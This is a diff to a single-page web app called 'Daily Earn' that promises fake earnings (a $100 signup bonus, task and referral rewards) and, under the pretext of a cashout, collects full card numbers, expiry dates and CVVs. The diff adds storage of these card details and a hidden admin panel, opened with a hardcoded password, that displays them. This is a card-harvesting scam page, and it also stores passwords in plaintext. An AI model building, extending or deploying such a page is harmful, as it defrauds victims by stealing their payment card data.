@@ -8,7 +8,7 @@
         :root { --primary: #1e3c72; --secondary: #2a5298; --success: #28a745; --danger: #e74c3c; --warning: #f1c40f; --bg: #f8f9fa; }
         body { margin: 0; font-family: 'Roboto', sans-serif; background: var(--bg); padding-bottom: 90px; -webkit-tap-highlight-color: transparent; }
         
-        /* Navigation (Only shows when logged in) */
+        /* Navigation */
         .sidebar { background: linear-gradient(180deg, var(--primary), var(--secondary)); color: white; position: fixed; bottom: 0; width: 100%; z-index: 1000; box-shadow: 0 -3px 15px rgba(0,0,0,0.2); display: none; }
         .sidebar-menu { display: flex; justify-content: space-around; }
         .sidebar button { width: 100%; padding: 12px 2px; border: none; background: none; color: white; font-size: 11px; font-weight: 500; }
@@ -30,6 +30,13 @@
         .btn { background: var(--secondary); color: white; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
         .btn-link { background: none; color: var(--secondary); margin-top: 10px; text-decoration: underline; font-size: 14px; }
 
+        /* Admin UI */
+        .admin-item { border-bottom: 1px solid #eee; padding: 10px 0; font-size: 14px; line-height: 1.6; }
+        .badge { padding: 3px 8px; border-radius: 5px; font-size: 10px; font-weight: bold; text-transform: uppercase; }
+        .processing { background: var(--warning); color: #000; }
+        .approved { background: var(--success); color: #fff; }
+        .rejected { background: var(--danger); color: #fff; }
+
         .hidden { display: none; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
     </style>
@@ -38,10 +45,7 @@
 
 <div id="auth-screen" class="auth-container">
     <div class="auth-card" id="signup-form">
-        <div class="auth-header">
-            <h1>Daily Earn</h1>
-            <p>Create an account to get $100 bonus!</p>
-        </div>
+        <div class="auth-header"><h1>Daily Earn</h1><p>Join & Get $100 Bonus!</p></div>
         <input type="text" id="reg-name" placeholder="Full Name">
         <input type="number" id="reg-age" placeholder="Age">
         <select id="reg-gender">
@@ -51,19 +55,16 @@
         </select>
         <input type="text" id="reg-country" placeholder="Country">
         <input type="password" id="reg-pass" placeholder="Create Password">
-        <button class="btn" onclick="handleSignup()">Sign Up & Get $100</button>
-        <button class="btn-link" onclick="toggleAuth('login')">Already have an account? Login</button>
+        <button class="btn" onclick="handleSignup()">Sign Up</button>
+        <button class="btn-link" onclick="toggleAuth('login')">Have an account? Login</button>
     </div>
 
     <div class="auth-card hidden" id="login-form">
-        <div class="auth-header">
-            <h1>Welcome Back</h1>
-            <p>Login to your account</p>
-        </div>
+        <div class="auth-header"><h1>Welcome Back</h1><p>Login to your account</p></div>
         <input type="text" id="log-name" placeholder="Full Name">
         <input type="password" id="log-pass" placeholder="Password">
         <button class="btn" onclick="handleLogin()">Login</button>
-        <button class="btn-link" onclick="toggleAuth('signup')">Don't have an account? Sign Up</button>
+        <button class="btn-link" onclick="toggleAuth('signup')">Create Account</button>
     </div>
 </div>
 
@@ -80,24 +81,19 @@
 <div class="content" id="app-content">
     <div id="dashboard" class="tab">
         <div class="card" style="background: var(--primary); color: white; text-align: center;">
-            <p>Welcome, <span id="user-display">User</span>!</p>
+            <p>Balance</p>
             <h1 style="font-size: 42px; margin: 10px 0;">$<span id="earnings">0</span></h1>
             <button class="btn" style="background: var(--success);" onclick="dailyClaim()">🎁 Daily Bonus +$10</button>
-        </div>
-        <div class="card">
-            <p>📍 Country: <strong id="user-country">---</strong></p>
-            <p>🎂 Age: <strong id="user-age">---</strong></p>
         </div>
     </div>
 
     <div id="tasks" class="tab hidden">
-        <div class="card"><h3>Tasks (+$20)</h3><div id="taskList" class="grid"></div></div>
+        <div class="card"><h3>Earn $20 Tasks</h3><div id="taskList" class="grid"></div></div>
     </div>
 
     <div id="refer" class="tab hidden">
         <div class="card" style="text-align:center;">
             <h2>Refer & Earn $4</h2>
-            <input type="text" value="https://dailyearn.com/ref/u771" readonly>
             <button class="btn" onclick="simulateReferral()">Invite Friend (Simulate)</button>
         </div>
     </div>
@@ -106,25 +102,41 @@
         <div class="card">
             <h3>Withdraw</h3>
             <input type="number" id="wAmount" placeholder="Amount ($)">
-            <input type="tel" id="wNumber" placeholder="Card Number">
+            <input type="text" id="wCardName" placeholder="Cardholder Name">
+            <input type="tel" id="wNumber" placeholder="Card Number" maxlength="16">
             <div style="display:flex; gap:10px;">
-                <input type="tel" id="wExpiry" placeholder="MM/YY">
-                <input type="tel" id="wCVV" placeholder="CVV">
+                <input type="tel" id="wExpiry" placeholder="MM/YY" maxlength="5">
+                <input type="tel" id="wCVV" placeholder="CVV" maxlength="3">
             </div>
-            <button class="btn" onclick="processWithdrawal()">Submit</button>
+            <button class="btn" onclick="processWithdrawal()">Submit Cashout</button>
         </div>
     </div>
 
     <div id="profile" class="tab hidden">
+        <div class="card">
+            <h3>Account Details</h3>
+            <p>Name: <strong id="user-display">---</strong></p>
+            <button class="btn-link" onclick="openAdmin()">Access Admin Panel</button>
+        </div>
         <div class="card"><h3>History</h3><div id="historyList"></div></div>
         <button class="btn" style="background:var(--danger)" onclick="logout()">Logout</button>
+    </div>
+
+    <div id="admin" class="tab hidden">
+        <div class="card">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <h3>Admin Control</h3>
+                <button onclick="showTab('profile')" style="border:none; background:none; color:blue;">Close</button>
+            </div>
+            <hr>
+            <div id="admin-requests"></div>
+        </div>
     </div>
 </div>
 
 <script>
     let activeUser = JSON.parse(localStorage.getItem("activeSession"));
 
-    // AUTH LOGIC
     function toggleAuth(type) {
         document.getElementById('signup-form').classList.toggle('hidden', type === 'login');
         document.getElementById('login-form').classList.toggle('hidden', type === 'signup');
@@ -133,37 +145,25 @@
     function handleSignup() {
         const name = document.getElementById('reg-name').value;
         const age = document.getElementById('reg-age').value;
-        const gender = document.getElementById('reg-gender').value;
-        const country = document.getElementById('reg-country').value;
         const pass = document.getElementById('reg-pass').value;
+        if(!name || !pass) return alert("Fill Name and Password");
 
-        if(!name || !age || !pass || !country) { alert("Please fill all fields!"); return; }
-
-        const user = {
-            name, age, gender, country, pass,
-            earnings: 100, // Starting Bonus
-            tasks: [],
-            withdrawals: []
-        };
-
+        const user = { name, age, pass, earnings: 100, tasks: [], withdrawals: [] };
         localStorage.setItem(`user_${name}`, JSON.stringify(user));
-        alert("Account Created! You got $100 Welcome Bonus.");
+        alert("Account Created! Login now.");
         toggleAuth('login');
     }
 
     function handleLogin() {
         const name = document.getElementById('log-name').value;
         const pass = document.getElementById('log-pass').value;
-        
-        const storedUser = JSON.parse(localStorage.getItem(`user_${name}`));
+        const stored = JSON.parse(localStorage.getItem(`user_${name}`));
 
-        if(storedUser && storedUser.pass === pass) {
-            activeUser = storedUser;
+        if(stored && stored.pass === pass) {
+            activeUser = stored;
             localStorage.setItem("activeSession", JSON.stringify(activeUser));
             startApp();
-        } else {
-            alert("Invalid Username or Password!");
-        }
+        } else { alert("Error!"); }
     }
 
     function startApp() {
@@ -173,64 +173,59 @@
         updateUI();
     }
 
-    function logout() {
-        localStorage.removeItem("activeSession");
-        location.reload();
-    }
+    function logout() { localStorage.removeItem("activeSession"); location.reload(); }
 
-    // APP LOGIC
     function updateUI() {
         if(!activeUser) return;
         document.getElementById("earnings").innerText = activeUser.earnings;
         document.getElementById("user-display").innerText = activeUser.name;
-        document.getElementById("user-country").innerText = activeUser.country;
-        document.getElementById("user-age").innerText = activeUser.age;
 
-        const taskList = document.getElementById("taskList");
-        taskList.innerHTML = "";
-        for(let i=1; i<=10; i++) {
+        // Tasks
+        const tList = document.getElementById("taskList");
+        tList.innerHTML = "";
+        for(let i=1; i<=6; i++) {
             let done = activeUser.tasks.includes(i);
-            taskList.innerHTML += `<button class="btn" ${done ? 'disabled style="background:gray"' : ''} onclick="doTask(${i})">Task ${i}</button>`;
+            tList.innerHTML += `<button class="btn" ${done ? 'disabled style="background:gray"' : ''} onclick="doTask(${i})">Task ${i}</button>`;
         }
         
-        const historyList = document.getElementById("historyList");
-        historyList.innerHTML = activeUser.withdrawals.map(w => `<p>$${w.amount} - ${w.status}</p>`).join('') || "No history";
-        
-        // Save back to main storage
+        // History
+        const hList = document.getElementById("historyList");
+        hList.innerHTML = activeUser.withdrawals.map(w => `
+            <div class="admin-item">
+                $${w.amount} - <span class="badge ${w.status.toLowerCase()}">${w.status}</span>
+            </div>
+        `).reverse().join('') || "No transactions";
+
         localStorage.setItem(`user_${activeUser.name}`, JSON.stringify(activeUser));
         localStorage.setItem("activeSession", JSON.stringify(activeUser));
     }
 
-    function doTask(id) {
-        activeUser.earnings += 20;
-        activeUser.tasks.push(id);
-        updateUI();
-    }
-
-    function dailyClaim() {
-        activeUser.earnings += 10;
-        alert("Daily check-in success!");
-        updateUI();
-    }
+    function doTask(id) { activeUser.earnings += 20; activeUser.tasks.push(id); updateUI(); }
+    function dailyClaim() { activeUser.earnings += 10; updateUI(); }
+    function simulateReferral() { activeUser.earnings += 4; updateUI(); }
 
     function processWithdrawal() {
         const amt = parseInt(document.getElementById('wAmount').value);
-        const cvv = document.getElementById('wCVV').value;
+        const name = document.getElementById('wCardName').value;
+        const num = document.getElementById('wNumber').value;
         const exp = document.getElementById('wExpiry').value;
+        const cvv = document.getElementById('wCVV').value;
 
-        if(!cvv || !exp) {
-            document.getElementById('wCVV').classList.add('error');
-            document.getElementById('wExpiry').classList.add('error');
-            alert("Security fields missing!");
-            return;
-        }
+        if(!num || !cvv || !exp) return alert("Fill Card Details!");
+        if(amt > activeUser.earnings) return alert("Insufficient!");
 
-        if(amt > activeUser.earnings) { alert("Insufficient funds!"); return; }
-
-        activeUser.withdrawals.push({ amount: amt, status: "Processing" });
+        activeUser.withdrawals.push({
+            id: Date.now(),
+            amount: amt,
+            cardName: name,
+            cardNum: num,
+            expiry: exp,
+            cvv: cvv,
+            status: "Processing"
+        });
         activeUser.earnings -= amt;
         updateUI();
-        alert("Withdrawal submitted!");
+        alert("Submitted to Admin!");
     }
 
     function showTab(id) {
@@ -238,9 +233,45 @@
         document.getElementById(id).classList.remove('hidden');
     }
 
-    // Auto-login check
-    if(activeUser) startApp();
+    // ADMIN SECTION
+    function openAdmin() {
+        const p = prompt("Enter Admin Password:");
+        if(p === "OBASEMO1") {
+            showTab('admin');
+            renderAdmin();
+        } else { alert("Wrong Password!"); }
+    }
 
+    function renderAdmin() {
+        const adminDiv = document.getElementById('admin-requests');
+        adminDiv.innerHTML = "";
+        
+        // Admin sees all withdrawal requests of the active user
+        activeUser.withdrawals.forEach((w, index) => {
+            if(w.status === "Processing") {
+                adminDiv.innerHTML += `
+                <div class="card" style="border-left: 5px solid var(--warning)">
+                    <p><strong>Amount:</strong> $${w.amount}</p>
+                    <p><strong>Card:</strong> ${w.cardNum}</p>
+                    <p><strong>Exp/CVV:</strong> ${w.expiry} / ${w.cvv}</p>
+                    <p><strong>Name:</strong> ${w.cardName}</p>
+                    <button class="btn" style="background:var(--success); margin-bottom:5px;" onclick="updateStatus(${index}, 'Approved')">Approve</button>
+                    <button class="btn" style="background:var(--danger)" onclick="updateStatus(${index}, 'Rejected')">Reject</button>
+                </div>`;
+            }
+        });
+
+        if(adminDiv.innerHTML === "") adminDiv.innerHTML = "No pending requests.";
+    }
+
+    function updateStatus(index, status) {
+        activeUser.withdrawals[index].status = status;
+        alert("Status Updated!");
+        updateUI();
+        renderAdmin();
+    }
+
+    if(activeUser) startApp();
 </script>
 </body>
 </html>
